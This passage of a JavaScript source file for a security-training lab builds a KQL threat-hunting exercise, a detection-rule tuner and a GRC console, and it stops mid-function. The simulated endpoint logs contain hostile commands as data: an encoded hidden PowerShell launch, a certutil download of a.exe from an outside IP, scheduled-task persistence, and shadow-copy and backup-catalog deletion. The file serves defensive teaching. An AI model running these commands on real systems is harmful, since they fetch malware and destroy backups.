/* ================= LabOS apps (2): SIEM Hunt, GRC Console, Privacy Console ================= */

/* ---------- SIEM Hunt (KQL hunting on endpoint data + detection-rule tuning) ---------- */
const DPE = (t, dev, acct, file, cmd, parent) => ({TimeGenerated:t, DeviceName:dev, AccountName:acct, FileName:file, ProcessCommandLine:cmd, InitiatingProcessFileName:parent});
KQLDB.DeviceProcessEvents = {cols:["TimeGenerated","DeviceName","AccountName","FileName","ProcessCommandLine","InitiatingProcessFileName"], rows:[
  DPE("09:02","FIN-LT-07","r.verma","OUTLOOK.EXE","OUTLOOK.EXE","explorer.exe"),
  DPE("09:03","FIN-LT-07","r.verma","EXCEL.EXE","EXCEL.EXE C:\\Users\\rverma\\Downloads\\Invoice_Oct.xlsm","OUTLOOK.EXE"),
  DPE("09:03","FIN-LT-07","r.verma","powershell.exe","powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA","EXCEL.EXE"),
  DPE("09:04","FIN-LT-07","r.verma","certutil.exe","certutil.exe -urlcache -split -f http://45.83.10.9/a.png C:\\Users\\Public\\a.exe","powershell.exe"),
  DPE("09:05","FIN-LT-07","r.verma","a.exe","C:\\Users\\Public\\a.exe","powershell.exe"),
  DPE("09:06","FIN-LT-07","r.verma","schtasks.exe","schtasks /create /sc minute /mo 30 /tn OneDriveSync /tr C:\\Users\\Public\\a.exe","a.exe"),
  DPE("09:20","HR-LT-03","s.iyer","chrome.exe","chrome.exe","explorer.exe"),
  DPE("09:25","HR-LT-03","s.iyer","WINWORD.EXE","WINWORD.EXE C:\\Users\\siyer\\Documents\\policy.docx","explorer.exe"),
  DPE("09:40","IT-SRV-01","svc_backup","vssadmin.exe","vssadmin list shadows","svchost.exe"),
  DPE("10:12","FS-SRV-02","r.verma","vssadmin.exe","vssadmin delete shadows /all /quiet","a.exe"),
  DPE("10:13","FS-SRV-02","r.verma","wbadmin.exe","wbadmin delete catalog -quiet","a.exe"),
  DPE("10:14","FIN-LT-07","r.verma","vssadmin.exe","vssadmin delete shadows /all /quiet","a.exe"),
  DPE("10:30","DEV-LT-11","k.nair","powershell.exe","powershell.exe Get-ChildItem C:\\repo","WindowsTerminal.exe"),
  DPE("10:31","DEV-LT-11","k.nair","git.exe","git pull","powershell.exe"),
  DPE("11:00","HR-LT-03","s.iyer","EXCEL.EXE","EXCEL.EXE C:\\Users\\siyer\\Documents\\leave_tracker.xlsx","explorer.exe"),
  DPE("11:05","IT-SRV-01","svc_backup","powershell.exe","powershell.exe -File C:\\scripts\\nightly_backup.ps1","svchost.exe")
]};
const HUNTS = [
 {id:"h1", q:"Which device ran PowerShell that was started by Excel? A spreadsheet launching a shell is a classic sign of a malicious macro.", a:["fin-lt-07"], hint:'DeviceProcessEvents | where InitiatingProcessFileName == "EXCEL.EXE" and FileName == "powershell.exe" | project DeviceName, AccountName'},
 {id:"h2", q:"Which built-in Windows tool downloaded the malware from the internet? (Attackers love tools that are already installed.)", a:["certutil","certutil.exe"], hint:'DeviceProcessEvents | where ProcessCommandLine contains "http" | project FileName, ProcessCommandLine'},
 {id:"h3", q:"On how many different devices were backups (shadow copies) deleted? Ransomware does this before encrypting.", a:["2","two"], hint:'DeviceProcessEvents | where ProcessCommandLine contains "delete shadows" | summarize dcount(DeviceName)'},
 {id:"h4", q:"What name did the attacker give the scheduled task that keeps the malware running?", a:["onedrivesync"], hint:'DeviceProcessEvents | where FileName == "schtasks.exe" | project ProcessCommandLine'}
];
const TUNE = [
 {n:"185.220.101.4 → admin (brute force)", ip:40, user:40, atk:true}, {n:"203.0.113.77 → 30 users (password spray)", ip:35, user:2, atk:true},
 {n:"45.83.10.9 → r.verma (brute force)", ip:25, user:25, atk:true}, {n:"198.51.100.23 → k.nair (brute force)", ip:18, user:18, atk:true},
 {n:"91.240.118.5 → m.rao (slow brute force)", ip:12, user:12, atk:true}, {n:"Office NAT 10.0.4.1 (Monday logins)", ip:10, user:2, atk:false},
 {n:"svc-scanner (wrong saved password)", ip:9, user:9, atk:false}, {n:"Hotel Wi-Fi at a conference (shared IP)", ip:7, user:3, atk:false},
 {n:"p.shah VPN reconnect loop", ip:6, user:6, atk:false}, {n:"j.negi with caps lock on", ip:5, user:5, atk:false},
 {n:"s.iyer typing on a new phone", ip:4, user:4, atk:false}, {n:"a.das forgot their password", ip:3, user:3, atk:false}
];
const RESP = [["notify","Post the alert to the SOC channel",1],["block","Block the source IP at the firewall for 24 hours",1],["reset","Force a password reset if any sign-in succeeded",0],["delmb","Delete the targeted user's mailbox",-1],["disall","Permanently disable every account the IP touched",-1]];
function tuneStats(by, n){ let tp = 0, fp = 0, fn = 0, tn = 0; TUNE.forEach(x => { const al = x[by] >= n; if (al && x.atk) tp++; else if (al) fp++; else if (x.atk) fn++; else tn++; }); return {tp, fp, fn, tn, prec: tp + fp ? tp / (tp + fp) : 0, rec: tp / (tp + fn)}; }
const tuneGood = st => { const s = tuneStats(st.by || "user", st.n || 5); return s.rec === 1 && s.prec >= 0.8; };
const huntNorm = s => String(s || "").trim().toLowerCase().replace(/\s+/g, "");
const huntOk = (st, id) => { const h = HUNTS.find(x => x.id === id); return !!h && h.a.includes(huntNorm((st.ans || {})[id])); };
const ruleSavedOk = st => !!st.saved && ["Medium","High"].includes(st.sev) && RESP.filter(r => r[2] === 1).every(r => (st.resp || []).includes(r[0])) && !RESP.filter(r => r[2] === -1).some(r => (st.resp || []).includes(r[0]));
losRegister({id:"siem", title:"SIEM Hunt", icon:"◎", color:"#1D4ED8", size:[1000,640], mount(body, ctx, args){
  const st = ctx.st; st.ans ||= {}; st.by ||= "user"; st.n ||= 5; st.resp ||= [];
  let tab = opTabFor("siem", args.op) || "hunt", q = st.q || "DeviceProcessEvents\n| take 10", res = null, err = "", showHint = {}, msg = "";
  const runQ = () => { try { const r = kqlRun(q); res = r; err = ""; st.queries = (st.queries || 0) + 1; st.q = q; ctx.save(); } catch(e) { res = null; err = e.message; } };
  const tblHtml = r => `<div class="tblwrap"><table class="tbl kqlres"><thead><tr>${r.cols.map(c => `<th>${esc(c)}</th>`).join("")}</tr></thead><tbody>${r.rows.slice(0, 50).map(row => `<tr>${r.cols.map(c => `<td>${esc(Array.isArray(row[c]) ? "[" + row[c].join(", ") + "]" : row[c])}</td>`).join("")}</tr>`).join("")}</tbody></table></div><span class="num">${r.rows.length} row${r.rows.length === 1 ? "" : "s"}${r.rows.length > 50 ? " (first 50 shown)" : ""}</span>`;
  const tuner = () => { const s = tuneStats(st.by, st.n), W = 660, rowH = 26, max = 40, X0 = 250, sc = (W - X0 - 96) / max, H = TUNE.length * rowH + 30, tx = X0 + st.n * sc;
    return `<p class="num">A detection rule fires when failed sign-ins in 10 minutes reach a threshold. Too low and analysts drown in false alarms; too high and attacks slip through. These 12 past events are labelled, so you can measure both.</p>
      <div class="row"><span class="num">Count failures per</span><div class="seg" role="group" aria-label="Group by"><button aria-pressed="${st.by==="user"}" data-tby="user">User account</button><button aria-pressed="${st.by==="ip"}" data-tby="ip">Source IP</button></div>
        <label class="f row" style="gap:8px">Alert at <input type="range" id="tN" min="2" max="40" value="${st.n}" aria-label="Threshold"><b class="num">${st.n}+ failures</b></label></div>
      <svg class="tunesvg" viewBox="0 0 ${W} ${H}" role="img" aria-label="Events against the threshold">${TUNE.map((x, i) => { const v = x[st.by], y = 10 + i * rowH, al = v >= st.n; return `<text x="0" y="${y + 15}" class="tl">${esc(x.n.length > 38 ? x.n.slice(0, 37) + "…" : x.n)}</text><rect x="${X0}" y="${y + 3}" width="${Math.max(2, v * sc)}" height="16" rx="4" class="tb ${al ? "al" : ""} ${x.atk ? "atk" : ""}"/><text x="${X0 + v * sc + 6}" y="${y + 15}" class="tv">${v}${x.atk ? " · attack" : ""}</text>`; }).join("")}<line x1="${tx}" x2="${tx}" y1="4" y2="${H - 4}" class="tline"/></svg>
      <div class="tlegend num"><span><i class="k1"></i>alert on an attack (caught)</span><span><i class="k2"></i>alert on a normal event (false alarm)</span><span><i class="k3"></i>attack missed</span><span><i class="k4"></i>normal, no alert</span><span><i class="k5"></i>threshold</span></div>
      <div class="grid4"><div class="inset tile"><span class="lbl">Caught attacks (recall)</span><span class="big ${s.rec === 1 ? "okc" : ""}">${Math.round(s.rec * 100)}%</span><span class="num">${s.tp} of 5 · goal 100%</span></div><div class="inset tile"><span class="lbl">Alerts that were real (precision)</span><span class="big ${s.prec >= .8 ? "okc" : ""}">${Math.round(s.prec * 100)}%</span><span class="num">${s.tp} of ${s.tp + s.fp} alerts · goal 80%+</span></div><div class="inset tile"><span class="lbl">False alarms</span><span class="big">${s.fp}</span></div><div class="inset tile"><span class="lbl">Missed attacks</span><span class="big">${s.fn}</span></div></div>
      ${tuneGood(st) ? `<div class="info">Tuned: every attack is caught and at least 8 in 10 alerts are real. Counting by IP is what catches password spraying, where each account sees only one or two failures.</div>` : st.by === "user" && st.n <= 2 ? `<div class="note">Every event alerts now. Notice the spray only ever shows 2 failures per account. What if you counted per IP instead?</div>` : ""}`; };
  const saver = () => `<p class="num">A rule isn't finished until it says how serious it is and what happens automatically. Automation should be safe to run without a human, and never destructive.</p>
    <label class="f">Rule name<input type="text" value="Brute force or password spray from one IP" readonly></label>
    <label class="f">Severity<select id="rSev"><option value="">Choose…</option>${["Informational","Low","Medium","High"].map(s => `<option ${st.sev===s?"selected":""}>${s}</option>`).join("")}</select></label>
    <fieldset class="clean"><legend class="num">Automated responses</legend>${RESP.map(([k, l]) => `<label class="chk"><input type="checkbox" data-rresp="${k}" ${st.resp.includes(k)?"checked":""}> ${esc(l)}</label>`).join("")}</fieldset>
    <div class="row"><button class="btn" data-rsave="1">Save rule</button>${msg ? `<span class="num">${esc(msg)}</span>` : ""}</div>${ruleSavedOk(st) ? `<div class="info">Saved and enabled. In Microsoft Sentinel this would be a scheduled analytics rule with an automation rule or playbook attached.</div>` : ""}`;
  const draw = () => {
    body.innerHTML = `<div class="apppad">${opStrip("siem")}${appTabs([["hunt","Threat hunt (KQL)"],["tune","Rule tuner"],["save","Save the rule"]], tab, "stab")}
    ${tab === "hunt" ? `<p class="num">Endpoint data from Monday morning. Something started on a finance laptop. Use KQL to answer the four questions. (Tables: ${Object.keys(KQLDB).map(t => `<button class="link" data-sins="${t}">${t}</button>`).join(", ")}.)</p>
      <div class="kqlbox"><textarea id="sQ" class="kqlin" rows="4" spellcheck="false" aria-label="KQL query">${esc(q)}</textarea><div class="row"><button class="btn sm" data-srun="1">▶ Run (Ctrl+Enter)</button><span class="num">Columns: ${KQLDB.DeviceProcessEvents.cols.join(", ")}</span></div></div>
      <div class="kqlout2">${err ? `<div class="note"><b>Query error:</b> ${esc(err)}</div>` : res ? tblHtml(res) : `<span class="num">Run a query to see results.</span>`}</div>
      <div class="hunts">${HUNTS.map((h, i) => { const ok = huntOk(st, h.id), tried = (st.ans || {})[h.id]; return `<div class="hunt ${ok ? "ok" : ""}"><b>${i + 1}. ${esc(h.q)}</b><div class="row"><input type="text" data-hans="${h.id}" value="${esc(st.ans[h.id] || "")}" placeholder="Your answer" aria-label="Answer ${i + 1}"><button class="btn sm ghost" data-hchk="${h.id}">Check</button>${ok ? `<span class="pill ok">✓ correct</span>` : tried ? `<span class="num">Not yet. Look at the results again.</span>` : ""}<button class="link" data-hhint="${h.id}">${showHint[h.id] ? "Hide" : "Show"} a query</button></div>${showHint[h.id] ? `<code class="hash">${esc(h.hint)}</code>` : ""}</div>`; }).join("")}</div>`
    : tab === "tune" ? tuner() : saver()}</div>`;
  };
  body.addEventListener("click", e => { const t = e.target.closest("[data-stab],[data-srun],[data-sins],[data-hchk],[data-hhint],[data-tby],[data-rsave]"); if (!t) return; const d = t.dataset;
    if (d.stab) { tab = d.stab; msg = ""; draw(); return; }
    if (d.srun) { q = body.querySelector("#sQ").value; runQ(); draw(); return; }
    if (d.sins) { q = d.sins + "\n| take 10"; runQ(); draw(); return; }
    if (d.hchk) { const inp = body.querySelector(`[data-hans="${d.hchk}"]`); st.ans[d.hchk] = inp ? inp.value : ""; const was = st.huntXP || {}; if (huntOk(st, d.hchk) && !was[d.hchk]) { was[d.hchk] = true; st.huntXP = was; ctx.xp(20, "Hunt question solved"); } ctx.save(); ctx.check(); draw(); return; }
    if (d.hhint) { showHint[d.hhint] = !showHint[d.hhint]; draw(); return; }
    if (d.tby) { st.by = d.tby; ctx.save(); ctx.check(); draw(); return; }
    if (d.rsave) { if (!tuneGood(st)) { msg = "Tune the rule first: the threshold isn't catching every attack with 80%+ precision yet."; draw(); return; }
      st.saved = true; msg = ruleSavedOk(st) ? "" : !["Medium","High"].includes(st.sev) ? "Repeated failed sign-ins from one source deserve Medium or High severity." : RESP.some(r => r[2] === -1 && st.resp.includes(r[0])) ? "One response is destructive: automation shouldn't delete or permanently disable things without a human decision." : "Make sure the SOC is told and the attacking IP is blocked."; ctx.save(); ctx.check(); draw(); return; }
  });
  body.addEventListener("input", e => { if (e.target.id === "tN") { st.n = +e.target.value; ctx.save(); ctx.check(); const pos = e.target.value; draw(); const r = body.querySelector("#tN"); if (r) { r.value = pos; r.focus(); } } if (e.target.id === "sQ") q = e.target.value; });
  body.addEventListener("change", e => { if (e.target.id === "rSev") { st.sev = e.target.value; ctx.save(); } if (e.target.dataset.rresp) { const k = e.target.dataset.rresp; st.resp = e.target.checked ? Array.from(new Set([...st.resp, k])) : st.resp.filter(x => x !== k); ctx.save(); } });
  body.addEventListener("keydown", e => { if (e.target.id === "sQ" && e.key === "Enter" && (e.ctrlKey || e.metaKey)) { e.preventDefault(); q = e.target.value; runQ(); draw(); const n = body.querySelector("#sQ"); if (n) n.focus(); } if (e.target.dataset.hans && e.key === "Enter") { e.preventDefault(); const b = body.querySelector(`[data-hchk="${e.target.dataset.hans}"]`); if (b) b.click(); } });
  runQ(); draw();
  return {onArgs: a => { const t = opTabFor("siem", a.op); if (t) { tab = t; draw(); } }};
}});

/* ---------- GRC Console (ServiceNow-style: attestation, risk register, vendor risk) ---------- */
const GRC_TEAMS = ["IT Security","IT Operations","Engineering","Privacy (DPO)","HR","Finance"];
const GRC_CTL = [
 {id:"AC-01", name:"Quarterly user access review", own:"IT Security", eff:false, ev:"Q1: review signed 12 Apr ✓\nQ2: review signed 9 Jul ✓\nQ3: no review found (it was due 15 Oct)", tip:"It ran in two quarters out of three, so it didn't operate for the whole period: ineffective."},
 {id:"AC-02", name:"MFA on remote access (VPN and email)", own:"IT Security", eff:true, ev:"Conditional-access policy 'Require MFA, all users' is ON.\n412 of 412 users registered.\nOne exclusion: a break-glass admin account, documented and monitored.", tip:"Full coverage, and the one exception is documented and monitored: effective."},
 {id:"CM-01", name:"Production changes approved before release", own:"Engineering", eff:false, ev:"Sample: 25 changes from July to September.\n23 approved in the change tool before deployment.\n2 emergency changes approved after release, with no follow-up review.", tip:"Two exceptions with no follow-up means the control didn't work as designed."},
 {id:"BC-02", name:"Daily backups with a quarterly restore test", own:"IT Operations", eff:true, ev:"Backup jobs succeeded 98.9% of the time; failures were re-run the same day.\nRestore test on 22 Aug: payroll DB restored in 41 minutes (target 4 hours).", tip:"Failures were caught and fixed, and the restore met its target: effective."},
 {id:"PR-01", name:"Privacy notice reviewed every year by the DPO", own:"Privacy (DPO)", eff:true, ev:"Notice v3.2 approved by the DPO on 18 Jan 2026.\nNext review booked for Jan 2027.", tip:"Reviewed within the year by the right person: effective."},
 {id:"LG-01", name:"Security logs kept for 180 days", own:"IT Operations", eff:false, ev:"SIEM retention setting: 90 days.\nFirewall logs: 30 days, stored only on the device.\n(CERT-In's 2022 directions require logs to be kept for a rolling 180 days, in India.)", tip:"The setting falls short of a legal requirement: ineffective, and a regulatory gap."}
];
const GRC_L = ["Rare: hasn't happened in our industry or area for 5+ years","Unlikely: happened elsewhere in our industry, never to us","Possible: happened to us once in the last 3 years","Likely: happened to us 1–2 times in the last 12 months","Almost certain: happening now, or 3+ times in 12 months"];
const GRC_I = ["Minimal: under ₹1 lakh, no personal data","Minor: ₹1–10 lakh, internal data only","Moderate: ₹10 lakh–₹1 crore, or limited customer data","Major: ₹1–10 crore, or a regulator must be told","Severe: over ₹10 crore, or exposure to DPDP penalties"];
const GRC_RISKS = [
 {id:"R1", t:"Phishing leads to a takeover of the finance mailbox", f:"Two staff clicked phishing links this year (February and July). A hijacked finance mailbox could redirect one vendor payment of about ₹40 lakh.", l:4, i:3, tr:["Mitigate"]},
 {id:"R2", t:"Customer database breached through the unpatched VPN", f:"Our VPN has a flaw on CISA's Known Exploited list, and attacks against it show up in the firewall logs every day this week. The database behind it holds 2 lakh customers' personal data, so a breach would have to be reported to the Data Protection Board.", l:5, i:5, tr:["Mitigate","Avoid"]},
 {id:"R3", t:"Payroll vendor goes out of business", f:"It has never happened to us; one similar payroll vendor in our industry shut down in 2024. Switching and delayed salaries would cost about ₹6 lakh.", l:2, i:2, tr:["Accept","Transfer"]},
 {id:"R4", t:"Lost laptop exposes client files", f:"One laptop was lost two years ago (it was encrypted). 30% of laptops still have no disk encryption. A lost unencrypted laptop would expose limited client data.", l:3, i:3, tr:["Mitigate"]},
 {id:"R5", t:"Flood takes out the office server room", f:"No flood has hit a business in our area in the last 10 years. If one did, losses would exceed ₹10 crore.", l:1, i:5, tr:["Transfer"]}
];
const riskBand = s => s >= 20 ? ["Critical","hot"] : s >= 10 ? ["High","warn"] : s >= 5 ? ["Medium","acc"] : ["Low","ok"];
const VQ = [
 {id:"q1", q:"Is our data encrypted at rest?", a:"Yes, AES-256 on all databases and backups.", flag:false},
 {id:"q2", q:"Is multi-factor authentication (MFA) required for admin access?", a:"Not yet. Planned for Q2 2027.", flag:true, why:"Admin accounts without MFA are the most common way into SaaS platforms."},
 {id:"q3", q:"Where will our data be stored?", a:"AWS Mumbai region. Backups are copied to Singapore.", flag:true, why:"Backups leave India. The contract must cover it, and you must check the country isn't restricted by the government under section 16 of the DPDP Act."},
 {id:"q4", q:"How quickly will you tell us about a breach?", a:"Within 30 days of confirming it.", flag:true, why:"Far too slow. You may have to report to CERT-In within 6 hours and tell the Data Protection Board without delay, so the vendor must tell you within hours."},
 {id:"q5", q:"Do you use sub-processors?", a:"Yes, three. The list is available after the contract is signed.", flag:true, why:"You need to know who else will touch the data before you sign, not after."},
 {id:"q6", q:"Do you have independent security assurance?", a:"SOC 2 Type II report for the period ending June 2026, available under NDA.", flag:false},
 {id:"q7", q:"Do you run penetration tests?", a:"Yes, every year by an external firm. Last test January 2026; all critical findings fixed.", flag:false},
 {id:"q8", q:"Do you use client data to train AI models?", a:"No.", flag:false}
];
const VEV = [["soc2","SOC 2 Type II report",1],["subp","List of sub-processors",1],["iso","ISO 27001 certificate",0],["pent","Latest pen-test summary",0],["aadhaar","Copies of their staff's Aadhaar cards",-1],["bank","Their company bank statements",-1]];
const VCL = [["mfa","Turn on MFA for all admin access within 60 days",1],["b24","Tell us about any breach within 24 hours",1],["subp","Share the sub-processor list, and tell us before adding a new one",1],["bkp","Tell us where backups are kept, and cover transfers outside India in the contract",1],["audit","Send us the SOC 2 report every year (right to audit)",0],["ai","The vendor may use our employees' data to improve its AI models",-1]];
const grcOwnOk = st => GRC_CTL.every(c => ((st.ctl || {})[c.id] || {}).owner === c.own);
const grcVerdOk = st => GRC_CTL.every(c => ((st.ctl || {})[c.id] || {}).v === (c.eff ? "eff" : "ineff"));
const grcIssOk = st => GRC_CTL.filter(c => !c.eff).every(c => !!((st.ctl || {})[c.id] || {}).issue) && grcVerdOk(st);
const riskScoreOk = st => GRC_RISKS.every(r => { const x = (st.risk || {})[r.id] || {}; return +x.l === r.l && +x.i === r.i; });
const riskTreatOk = st => GRC_RISKS.every(r => r.tr.includes(((st.risk || {})[r.id] || {}).tr));
const riskOwnOk = st => GRC_RISKS.filter(r => r.l * r.i >= 10).every(r => { const x = (st.risk || {})[r.id] || {}; return x.own && x.due; });
const vFlagOk = st => VQ.every(q => !!((st.vflag || {})[q.id]) === q.flag);
const vEvOk = st => VEV.filter(v => v[2] === 1).every(v => (st.vev || []).includes(v[0])) && !VEV.filter(v => v[2] === -1).some(v => (st.vev || []).includes(v[0]));
const vDecOk = st => st.vdec === "cond" && VCL.filter(c => c[2] === 1).every(c => (st.vcl || []).includes(c[0])) && !VCL.filter(c => c[2] === -1).some(c => (st.vcl || []).includes(c[0]));
losRegister({id:"grc", title:"GRC Console", icon:"▤", color:"#166534", size:[1040,660], mount(body, ctx, args){
  const st = ctx.st; st.ctl ||= {}; st.risk ||= {}; st.vflag ||= {}; st.vev ||= []; st.vcl ||= [];
  let tab = opTabFor("grc", args.op) || "ctl", open = null, note = "";
  const C = id => (st.ctl[id] ||= {}), R = id => (st.risk[id] ||= {});
  const ctlView = () => { const all = GRC_CTL.every(c => C(c.id).owner && C(c.id).v), eff = GRC_CTL.filter(c => C(c.id).v === "eff").length;
    return `<p class="num">Campaign: <b>Q3 2026 control attestation</b>. Assign each control to the team that runs it, open the evidence, decide whether it worked, and raise an issue for every failure.</p>
    <div class="tblwrap"><table class="tbl sn"><thead><tr><th>Control</th><th>Owner</th><th>Evidence</th><th>Result</th><th>Issue</th></tr></thead><tbody>${GRC_CTL.map(c => { const x = C(c.id); return `<tr class="${open === c.id ? "sel" : ""}"><td><b>${c.id}</b> ${esc(c.name)}</td>
      <td><select data-gown="${c.id}" aria-label="Owner of ${c.id}"><option value="">Assign…</option>${GRC_TEAMS.map(t => `<option ${x.owner===t?"selected":""}>${t}</option>`).join("")}</select>${x.owner && x.owner !== c.own ? `<span class="num warnc">Who runs this day to day?</span>` : ""}</td>
      <td><button class="link" data-gev="${c.id}">${open === c.id ? "Close" : "Open evidence"}</button></td>
      <td><select data-gv="${c.id}" aria-label="Result for ${c.id}"><option value="">Rate…</option><option value="eff" ${x.v==="eff"?"selected":""}>Effective</option><option value="ineff" ${x.v==="ineff"?"selected":""}>Ineffective</option></select></td>
      <td>${x.v === "ineff" ? (x.issue ? `<span class="pill ${x.issue.sev==="High"?"hot":"warn"}">ISS-${c.id} · ${x.issue.sev}</span>` : `<select data-giss="${c.id}" aria-label="Raise issue"><option value="">Raise issue…</option><option>Low</option><option>Medium</option><option>High</option></select>`) : `<span class="num">—</span>`}</td></tr>
      ${open === c.id ? `<tr class="evrow"><td colspan="5"><pre class="doc">${esc(c.ev)}</pre>${x.v ? `<p class="num">${(x.v === "eff") === c.eff ? "✓ " + esc(c.tip) : "✗ Look again: does the evidence show it worked for the whole period, as designed?"}</p>` : ""}</td></tr>` : ""}`; }).join("")}</tbody></table></div>
    <div class="row between"><span class="num">${GRC_CTL.filter(c => C(c.id).owner && C(c.id).v).length}/6 attested · ${eff} effective</span><button class="btn sm" data-gpub="1" ${all ? "" : "disabled"}>Publish attestation report</button></div>
    ${st.published ? `<div class="card inset report"><b>Q3 2026 attestation report</b><p class="num">Controls tested: 6 · effective: ${eff} (${Math.round(eff / 6 * 100)}%) · open issues: ${GRC_CTL.filter(c => C(c.id).issue).length}</p><ul class="clean">${GRC_CTL.filter(c => C(c.id).v === "ineff").map(c => `<li>${c.id} ${esc(c.name)}: ${C(c.id).issue ? "issue raised (" + C(c.id).issue.sev + "), due " + esc(C(c.id).issue.due) : "no issue raised yet"}</li>`).join("")}</ul></div>` : ""}${note ? `<div class="note">${esc(note)}</div>` : ""}`; };
  const riskView = () => `<p class="num">Score each risk with the rubric (likelihood × impact), choose a treatment, and give every High or Critical risk an owner and a due date.</p>
    <details class="rubric"><summary class="link">Scoring rubric and treatment rules</summary><div class="grid2"><div><b>Likelihood</b><ol class="clean">${GRC_L.map((x, i) => `<li><b>${i + 1}</b> ${esc(x)}</li>`).join("")}</ol></div><div><b>Impact</b><ol class="clean">${GRC_I.map((x, i) => `<li><b>${i + 1}</b> ${esc(x)}</li>`).join("")}</ol></div></div>
      <p class="num">Bands: 1–4 Low · 5–9 Medium · 10–16 High · 20–25 Critical. Treatment: Critical/High → Mitigate (or Avoid the activity). Medium → Mitigate when a reasonable control exists, or Transfer (insurance) when the impact is severe but rare. Low → Accept, with sign-off.</p></details>
    <div class="rlist">${GRC_RISKS.map(r => { const x = R(r.id), s = (+x.l || 0) * (+x.i || 0), b = s ? riskBand(s) : null, okS = +x.l === r.l && +x.i === r.i; return `<div class="rcard ${okS ? "ok" : ""}"><div class="row between"><b>${r.id} · ${esc(r.t)}</b>${b ? `<span class="pill ${b[1]}">${s} · ${b[0]}</span>` : ""}</div><p class="num">${esc(r.f)}</p>
      <div class="row"><label class="f">Likelihood<select data-gr="${r.id}|l"><option value="">–</option>${[1,2,3,4,5].map(n => `<option ${+x.l===n?"selected":""}>${n}</option>`).join("")}</select></label><label class="f">Impact<select data-gr="${r.id}|i"><option value="">–</option>${[1,2,3,4,5].map(n => `<option ${+x.i===n?"selected":""}>${n}</option>`).join("")}</select></label>
      <label class="f">Treatment<select data-gr="${r.id}|tr"><option value="">–</option>${["Mitigate","Accept","Transfer","Avoid"].map(n => `<option ${x.tr===n?"selected":""}>${n}</option>`).join("")}</select></label>
      ${s >= 10 ? `<label class="f">Owner<select data-gr="${r.id}|own"><option value="">–</option>${GRC_TEAMS.map(t => `<option ${x.own===t?"selected":""}>${t}</option>`).join("")}</select></label><label class="f">Due<input type="date" data-gr="${r.id}|due" value="${esc(x.due || "")}"></label>` : ""}</div>
      ${x.l && x.i && !okS ? `<span class="num warnc">Check the rubric against the facts.</span>` : ""}${x.tr && okS && !r.tr.includes(x.tr) ? `<span class="num warnc">Check the treatment rules for a ${riskBand(r.l * r.i)[0]} risk.</span>` : ""}</div>`; }).join("")}</div>
    <div class="row"><button class="btn sm ghost" data-gheat="1">${st.heatOpen ? "Hide" : "Show"} heat map</button></div>
    ${st.heatOpen ? `<div class="heat5" role="img" aria-label="Risk heat map"><span class="hy">Impact →</span>${[5,4,3,2,1].map(i => `<span class="hl">${i}</span>${[1,2,3,4,5].map(l => { const b = riskBand(l * i), here = GRC_RISKS.filter(r => +R(r.id).l === l && +R(r.id).i === i); return `<div class="hc b-${b[0].toLowerCase()}">${here.map(r => `<b>${r.id}</b>`).join("")}</div>`; }).join("")}`).join("")}<span></span>${[1,2,3,4,5].map(l => `<span class="hl">${l}</span>`).join("")}<span class="hx">Likelihood →</span></div>` : ""}`;
  const vendView = () => `<div class="card inset"><b>Vendor: CloudPay Payroll (SaaS)</b><p class="num">Will process every employee's name, PAN, bank account number and salary. Payroll stops if the service goes down.</p>
      <label class="f">Risk tier<select data-vtier="1"><option value="">Choose…</option>${["Low","Medium","High"].map(t => `<option ${st.vtier===t?"selected":""}>${t}</option>`).join("")}</select></label><p class="num">High = sensitive financial or ID data, or a service the business can't run without. Medium = internal data or an important service. Low = no personal data and easy to replace.</p></div>
    <b>Security questionnaire: flag every answer that's a risk</b>
    <div class="vq">${VQ.map(q => { const f = !!st.vflag[q.id]; return `<div class="vqrow ${f ? "flagged" : ""}"><div><span class="num">${esc(q.q)}</span><div>${esc(q.a)}</div>${f && q.why && st.vreveal ? `<span class="num">${esc(q.why)}</span>` : ""}</div><button class="btn sm ${f ? "" : "ghost"}" data-vflag="${q.id}" aria-pressed="${f}">${f ? "⚑ Flagged" : "Flag"}</button></div>`; }).join("")}</div>
    <div class="row"><button class="link" data-vreveal="1">${st.vreveal ? "Hide" : "Show"} why flagged answers matter</button><span class="num">${vFlagOk(st) ? "✓ Exactly the right answers flagged" : ""}</span></div>
    <div class="grid2"><div class="card inset"><b>Evidence to request</b>${VEV.map(([k, l]) => `<label class="chk"><input type="checkbox" data-vev="${k}" ${st.vev.includes(k)?"checked":""}> ${esc(l)}</label>`).join("")}${vEvOk(st) ? `<span class="num">✓ Good: you asked for proof, not for personal data you don't need.</span>` : ""}</div>
      <div class="card inset"><b>Decision</b><div class="seg" role="group" aria-label="Decision">${[["approve","Approve"],["cond","Approve with conditions"],["reject","Reject"]].map(([k, l]) => `<button aria-pressed="${st.vdec===k}" data-vdec="${k}">${l}</button>`).join("")}</div>
        ${st.vdec === "cond" ? `<span class="num">Contract conditions:</span>${VCL.map(([k, l]) => `<label class="chk"><input type="checkbox" data-vcl="${k}" ${st.vcl.includes(k)?"checked":""}> ${esc(l)}</label>`).join("")}` : st.vdec === "approve" ? `<span class="num warnc">Approving as-is accepts every red flag you found.</span>` : st.vdec === "reject" ? `<span class="num warnc">The gaps can be fixed by contract. Rejecting may be more than the risk needs.</span>` : ""}
        ${vDecOk(st) ? `<div class="info">Approved with conditions, and every red flag is covered by a clause.</div>` : ""}</div></div>`;
  const draw = () => { body.innerHTML = `<div class="apppad sngrc"><div class="snbar"><b>GRC</b><span class="num">Workspace › ${tab === "ctl" ? "Control attestation" : tab === "risk" ? "Risk register" : "Vendor risk"}</span></div>${opStrip("grc", tab)}${appTabs([["ctl","Controls"],["risk","Risk register"],["vend","Vendor risk"]], tab, "gtab")}${tab === "ctl" ? ctlView() : tab === "risk" ? riskView() : vendView()}</div>`; };
  const after = () => { ctx.save(); ctx.check(); draw(); };
  body.addEventListener("change", e => { const t = e.target, d = t.dataset;
    if (d.gown) { C(d.gown).owner = t.value; return after(); }
    if (d.gv) { C(d.gv).v = t.value; if (t.value !== "ineff") delete C(d.gv).issue; open = d.gv; st.published = false; return after(); }
    if (d.giss) { if (t.value) { const due = new Date(); due.setDate(due.getDate() + (t.value === "High" ? 30 : 60)); C(d.giss).issue = {sev:t.value, due:dayStr(due)}; } return after(); }
    if (d.gr) { const [id, f] = d.gr.split("|"); R(id)[f] = t.value; return after(); }
    if (d.vtier) { st.vtier = t.value; return after(); }
    if (d.vev) { const k = d.vev; st.vev = t.checked ? Array.from(new Set([...st.vev, k])) : st.vev.filter(x => x !== k); return after(); }
    if (d.vcl) { const k = d.vcl; st.vcl = t.checked ? Array.from(new Set([...st.vcl, k])) : st.vcl.filter(x => x !== k); return after(); }
  });
